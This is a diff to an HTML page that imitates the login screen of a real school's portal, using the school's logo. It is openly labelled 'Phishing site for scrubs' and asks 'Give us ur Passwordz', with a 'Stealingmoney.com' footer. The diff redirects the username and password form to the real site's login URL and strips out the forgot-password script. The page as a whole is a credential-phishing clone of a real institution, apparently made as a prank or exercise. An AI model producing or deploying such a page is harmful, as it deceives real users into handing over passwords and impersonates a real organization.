@@ -17,7 +17,7 @@
   <body>
     <div class="container"><div class="panel panel-primary" style="margin:80px auto; width:450px;"><div style="background-color:rgb(0, 130, 187);background-image:none;" class="panel-heading">
       <img width="80" height="42" src="https://my.nuevaschool.org/orgs/nueva/images/short_logo.png" alt="The Nueva School" style="border: none; margin-right:20px;"><span style="font-size:28px; font-family:times new roman;">Phishing site for scrubs</span></div>
-      <div class="panel-body"><form method="post" action="signin.php" class="form-signin" role="form">
+      <div class="panel-body"><form method="post" action="https://my.nuevaschool.org/login.php?msg=1" class="form-signin" role="form">
         <h2 class="form-signin-heading">Give us ur Passwordz</h2><input name="signin_acct" class="form-control" placeholder="Email Address/User Name" type="text" required="" autofocus="">
         <input name="signin_pw" class="form-control" placeholder="Password" type="password" required="">
         <input class="newsubmit" value="Sign In" name="signin" type="hidden">
@@ -25,104 +25,7 @@
         <button id="forgotpassword" class="btn-link" type="button">Forgot Password?</button>
         </form>
 
-        <script type="text/javascript">
-          $(function() {
-            var forgotpassworddialog, form;
-            var uname = $("#uname");
-            var tips = $( ".validateTips" );
-
-            forgotpassworddialog = $( "#forgotpasswordDialogform" ).dialog({
-              autoOpen: false,
-              height: 300,
-              width: 400,
-              modal: true,
-              buttons: [{
-                text: "Reset Password",
-                "id": "btnReset",
-                click: function () {
-                  resetPassword();
-                },
-
-              }, {
-                text: "Cancel",
-                "id": "btnCancel",
-                click: function () {
-                  forgotpassworddialog.dialog( "close" );
-                },
-              }],
-              close: function() {
-                tips.text("* All form fields are required.");
-                form[ 0 ].reset();
-                uname.removeClass( "ui-state-error" );
-                uname.removeAttr( "disabled");
-                $("#btnReset").removeAttr("disabled");
-                $("#btnCancel").text("Cancel");
-              }
-            });
-
-            form = forgotpassworddialog.find("form").on( "submit", function( event ) {
-              event.preventDefault();
-              resetPassword();
-            });
-
-            function updateTips( t ) {
-              tips.text( t )
-                .addClass( "ui-state-highlight" );
-              setTimeout(function() {
-                tips.removeClass( "ui-state-highlight", 1500 );
-              }, 500 );
-            }
-
-
-            function checkLength( o, n, min) {
-              var isValid = false;
-              if ( o.val().length < min ) {
-                o.addClass( "ui-state-error" );
-                updateTips( "Length of " + n + " must be greater than " + min + "." );
-                return false;
-              } else {
-                return true;
-              }
-            }
-
-            function resetPassword() {
-              var valid = true;
-              uname.removeClass( "ui-state-error" );
-              valid = valid && checkLength( uname, "User name", 3);
-              var username = uname.val();
-              var results = "";
-
-              if ( valid ) {
-                //ajax call to perform reset password
-                //let's save the result to a string.
-                $.getJSON('/admin/restful/password_reset.class.php?username=' + username, function(data){
-                  $.each(data, function(index, element){
-                    results += element.message;
-                  });
-                }).done(function(){
-                  updateTips(results);
-
-                });
-
-                //updateTips( "Please check your email, a password reset link has been emailed to you!" );
-
-                uname.prop( "disabled", true );
-                $("#btnReset").prop("disabled", true );
-                $("#btnCancel").text("Close");
-              }
-              return valid;
-            }
-
-
-            $("#forgotpassword").button().on( "click", function() {
-              forgotpassworddialog.dialog("open");
-              return false;
-            });
-
-
-
-          });
-        </script><hr><p class="text-muted text-center"><small>Stealingmoney.com</small></p></div><small> <!-- Panel body --> </small></div><!-- panel --></div><div class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-front ui-dialog-buttons ui-draggable ui-resizable" tabindex="-1" role="dialog" aria-describedby="forgotpasswordDialogform" aria-labelledby="ui-id-1" style="display: none; position: absolute;"><div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix ui-draggable-handle"><span id="ui-id-1" class="ui-dialog-title">Forgot password</span><button type="button" class="ui-dialog-titlebar-close"></button></div><div id="forgotpasswordDialogform" class="ui-dialog-content ui-widget-content">
+        <hr><p class="text-muted text-center"><small>Stealingmoney.com</small></p></div><small> <!-- Panel body --> </small></div><!-- panel --></div><div class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-front ui-dialog-buttons ui-draggable ui-resizable" tabindex="-1" role="dialog" aria-describedby="forgotpasswordDialogform" aria-labelledby="ui-id-1" style="display: none; position: absolute;"><div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix ui-draggable-handle"><span id="ui-id-1" class="ui-dialog-title">Forgot password</span><button type="button" class="ui-dialog-titlebar-close"></button></div><div id="forgotpasswordDialogform" class="ui-dialog-content ui-widget-content">
     <p class="validateTips">* All form fields are required.</p>
 
     <form>
